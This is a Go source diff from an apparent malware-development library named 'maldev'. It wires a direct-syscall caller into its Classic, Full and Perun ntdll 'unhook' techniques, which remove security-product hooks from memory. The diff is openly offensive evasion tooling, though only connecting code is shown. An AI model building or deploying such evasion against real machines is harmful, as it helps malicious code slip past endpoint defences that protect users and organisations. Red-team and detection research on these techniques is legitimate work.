@@ -6,6 +6,7 @@ import (
 	"fmt"
 
 	"github.com/oioio-space/maldev/evasion"
+	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
 
 // Classic returns a Technique that restores the first 5 bytes of a single
@@ -120,18 +121,24 @@ type classicTechnique struct {
 
 func (t classicTechnique) Name() string { return fmt.Sprintf("unhook:Classic(%s)", t.funcName) }
 
-// Apply ignores the caller parameter — ClassicUnhook does not yet accept a
-// syscall.Caller. The caller field is reserved for future direct-syscall support.
-func (t classicTechnique) Apply(_ evasion.Caller) error { return ClassicUnhook(t.funcName) }
+// Apply routes through the Caller for NtProtectVirtualMemory when non-nil,
+// falling back to standard WinAPI when nil.
+func (t classicTechnique) Apply(caller evasion.Caller) error {
+	c, _ := caller.(*wsyscall.Caller)
+	return ClassicUnhook(t.funcName, c)
+}
 
 // fullTechnique implements evasion.Technique for FullUnhook.
 type fullTechnique struct{}
 
 func (fullTechnique) Name() string { return "unhook:Full" }
 
-// Apply ignores the caller parameter — FullUnhook does not yet accept a
-// syscall.Caller. The caller field is reserved for future direct-syscall support.
-func (fullTechnique) Apply(_ evasion.Caller) error { return FullUnhook() }
+// Apply routes through the Caller for NtProtectVirtualMemory/NtWriteVirtualMemory
+// when non-nil, falling back to standard WinAPI when nil.
+func (fullTechnique) Apply(caller evasion.Caller) error {
+	c, _ := caller.(*wsyscall.Caller)
+	return FullUnhook(c)
+}
 
 // perunTechnique implements evasion.Technique for PerunUnhook.
 // The target field holds the process to spawn for reading the clean ntdll copy.
@@ -141,9 +148,12 @@ type perunTechnique struct {
 
 func (t perunTechnique) Name() string { return fmt.Sprintf("unhook:Perun(%s)", t.target) }
 
-// Apply ignores the caller parameter — PerunUnhook does not yet accept a
-// syscall.Caller. The caller field is reserved for future direct-syscall support.
+// Apply routes through the Caller for NtProtectVirtualMemory/NtWriteVirtualMemory
+// when non-nil, falling back to standard WinAPI when nil.
 //
 // Note: PerunUnhook hardcodes notepad.exe internally. The target field on this
 // struct documents intent but does not yet influence which process is spawned.
-func (t perunTechnique) Apply(_ evasion.Caller) error { return PerunUnhook() }
+func (t perunTechnique) Apply(caller evasion.Caller) error {
+	c, _ := caller.(*wsyscall.Caller)
+	return PerunUnhook(c)
+}
